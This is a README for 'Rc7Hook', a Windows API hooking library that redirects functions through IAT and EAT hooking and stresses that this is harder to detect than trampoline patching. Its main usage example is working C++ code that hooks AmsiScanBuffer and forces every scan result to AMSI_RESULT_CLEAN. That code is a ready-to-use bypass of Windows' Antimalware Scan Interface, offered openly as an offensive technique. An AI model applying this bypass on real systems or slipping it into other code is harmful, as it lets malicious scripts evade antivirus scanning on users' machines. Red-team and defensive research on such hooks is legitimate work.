
# Rc7Hook

A Patchless Windows API Hooking Library.


## How It Works
Rc7hook combines both [IAT Hooking](https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking) and [EAT Hooking](https://www.codereversing.com/archives/598) to completely redirect the target function to the specified hook procedure.

This means there's no need for patching the function with a trampoline, which is more detectable.

## Running The Examples
```
Rc7hook.exe <EXAMPLE>
```
```
Examples:
- MessageBoxHook
- AmsiHook
```

## Usage
### AmsiScanBuffer Hook | Bypassing AMSI
```cpp
typeAmsiScanBuffer orgAmsiScanBuffer;
HRESULT hookAmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result) {
	HRESULT orgCallResult = orgAmsiScanBuffer(amsiContext, buffer, length, contentName, amsiSession, result);

	(*result) = AMSI_RESULT_CLEAN;

	return orgCallResult;
}

void bypassAmsi() {

	// assuming that amsi.dll is loaded

	Rc7Hook amsiScanBufferHook{ "amsi.dll", "AmsiScanBuffer", hookAmsiScanBuffer, (PVOID*)&orgAmsiScanBuffer };

	if (amsiScanBufferHook.Enable()) {
		printf("[+] Enabled AmsiScanBuffer Hook!\n");
	}
	else {
		printf("[-] Failed to Enable AmsiScanBuffer Hook.\n");
	}

	printf("[*] Press a Key to Unhook.\n");
	getchar();

	if (amsiScanBufferHook.Disable()) {
		printf("[+] Disabled AmsiScanBuffer Hook!\n");
	}
	else {
		printf("[+] Failed to disable AmsiScanBuffer Hook.\n");
	}
}
```

## Credits
[EAT Hooking Article](https://www.codereversing.com/archives/598) by [Codereversing](https://www.codereversing.com/archives/598).
